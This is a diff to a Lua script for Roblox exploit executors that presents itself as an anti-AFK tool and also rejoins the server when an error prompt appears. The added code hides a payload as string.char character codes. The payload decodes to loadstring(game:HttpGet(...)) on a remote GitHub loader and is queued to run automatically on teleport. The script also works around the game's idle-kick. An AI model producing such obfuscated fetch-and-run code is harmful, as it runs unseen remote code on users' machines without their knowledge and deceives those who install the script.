@@ -75,24 +75,48 @@
 ⣞⢸⢧⡻⣜⣻⡵⣻⣞⢿⡾⣽⣻⣯⣿⢿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⢯⣟⣯⢿⣝⣻⡼⣳⢻⡜⣧⣛⢦⡙⢶⡱⢎⡕⡫⢜⠣⠖⡉⣄⠚⠬⣑⠲⡐⠤⡊⢍⡩⡙⡍⣋⠜⡩⢍⡩⠔⠣⠜⣐⠣⢢⠱⢠⠒⡌⠱⢎⡳⢎⡷⣹⢎⡷⣳⢞⣯⢷⣯⢿⡽⣟⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣻⡾⣽⢯⡷⣞
 --]===========================================================]
 
-local Players = game:GetService("Players")
-local VirtualUser = game:GetService("VirtualUser")
-local localPlayer = Players.LocalPlayer
-local yield = task.wait
-
 if getgenv().AntiAfkLoaded then return end
 getgenv().AntiAfkLoaded = true
 
-localPlayer.Idled:Connect(function()
-    VirtualUser:CaptureController()
-    VirtualUser:ClickButton2(Vector2.zero)
+local vu = game:GetService("VirtualUser")
+local ts = game:GetService("TeleportService")
+local cg = game:GetService("CoreGui")
+local lp = game:GetService("Players").LocalPlayer
+
+local yield = task.wait
+local pid, jid = game.PlaceId, game.JobId
+local qot = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
+
+local function anti()
+	vu:CaptureController()
+	vu:ClickButton2(Vector2.zero)
+end
+
+lp.Idled:Connect(anti)
+
+task.spawn(function()
+	while yield(600) do 
+		pcall(anti) 
+	end
 end)
 
 task.spawn(function()
-    while yield(900) do
-        pcall(function()
-            VirtualUser:CaptureController()
-            VirtualUser:ClickButton2(Vector2.zero)
-        end)
-    end
+	local promptGui = cg:WaitForChild("RobloxPromptGui", 10)
+	local promptOverlay = promptGui and promptGui:WaitForChild("promptOverlay", 10)
+
+	if promptOverlay then
+		local connection
+		connection = promptOverlay.ChildAdded:Connect(function(child)
+			if child.Name == "ErrorPrompt" then
+				connection:Disconnect()
+				if qot then
+					qot(string.char(108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,122,117,114,97,105,48,50,47,122,117,114,97,105,45,104,117,98,47,109,97,105,110,47,83,99,114,47,108,111,97,100,101,114,46,108,117,97,34,41,41,40,41))
+				end
+				if not pcall(ts.TeleportToPlaceInstance, ts, pid, jid, lp) then
+					yield(1)
+					ts:Teleport(pid, lp)
+				end
+			end
+		end)
+	end
 end)
